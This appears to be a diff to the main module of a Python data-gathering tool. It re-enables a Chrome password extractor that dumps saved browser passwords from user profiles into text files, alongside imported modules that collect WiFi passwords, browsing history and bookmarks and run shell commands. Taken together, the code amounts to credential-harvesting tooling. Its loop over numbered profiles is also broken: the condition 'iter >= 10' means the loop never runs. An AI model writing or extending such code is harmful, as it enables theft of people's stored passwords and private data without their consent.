@@ -3,11 +3,11 @@ import time
 from getpass import getuser
 
 import src.utils.file_manager as file_manager
+from src.modules.chrome_passwords import ChromePasswords
+from src.modules.shell_run import RunCommand
 from src.modules.web_bookmarks import WebBookmarks
 from src.modules.web_history import WebHistory
 from src.modules.wifi import Wifi as Wifi_Passwords
-# from src.modules.chrome_passwords import ChromePasswords
-from src.modules.shell_run import RunCommand
 
 
 class Main:
@@ -76,34 +76,34 @@ class Main:
             json_file_name=web_history_file_name_json
         )
 
-    # def run_ChromePasswords(self):
-    #     file_manager.add_seperator(topic="Chrome Passwords",
-    #                                symbol="*",
-    #                                file=self.error_file)
+    def run_ChromePasswords(self):
+        file_manager.add_seperator(topic="Chrome Passwords",
+                                   symbol="*",
+                                   file=self.error_file)
 
-    #     chrome_pass_folder = os.path.join(self.save_folder, "chromepass")
-    #     file_manager.create_folder_if_not_exists(chrome_pass_folder)
+        chrome_pass_folder = os.path.join(self.save_folder, "chromepass")
+        file_manager.create_folder_if_not_exists(chrome_pass_folder)
 
-    #     savefname = os.path.join(chrome_pass_folder, "chromePass_default.txt")
-    #     ChromePasswords(profile="Default",
-    #                     savefname="profile_default",
-    #                     save_folder_name=chrome_pass_folder,
-    #                     error_file=self.error_file,
-    #                     )
+        savefname = os.path.join(chrome_pass_folder, "chromePass_default.txt")
+        ChromePasswords(profile="Default",
+                        savefname="profile_default",
+                        save_folder_name=chrome_pass_folder,
+                        error_file=self.error_file,
+                        )
 
-    #     iter = 0
-    #     while iter >= 10:
-    #         iter += 1
-    #         savefname = os.path.join(
-    #             chrome_pass_folder, f"chromePass_{iter}.txt")
-    #         with open(savefname, "w", encoding="utf-8") as ftemp:
-    #             ChromePasswords(profile=f"Profile {iter}",
-    #                             savefname=f"profile{iter}",
-    #                             save_f_name=None,
-    #                             save_folder_name=chrome_pass_folder,
-    #                             error_file=self.error_file,
-    #                             data_write_file=ftemp
-    #                             )
+        iter = 0
+        while iter >= 10:
+            iter += 1
+            savefname = os.path.join(
+                chrome_pass_folder, f"chromePass_{iter}.txt")
+            with open(savefname, "w", encoding="utf-8") as ftemp:
+                ChromePasswords(profile=f"Profile {iter}",
+                                savefname=f"profile{iter}",
+                                save_f_name=None,
+                                save_folder_name=chrome_pass_folder,
+                                error_file=self.error_file,
+                                data_write_file=ftemp
+                                )
 
     def run_ShellCommandList(self):
         command_list = [
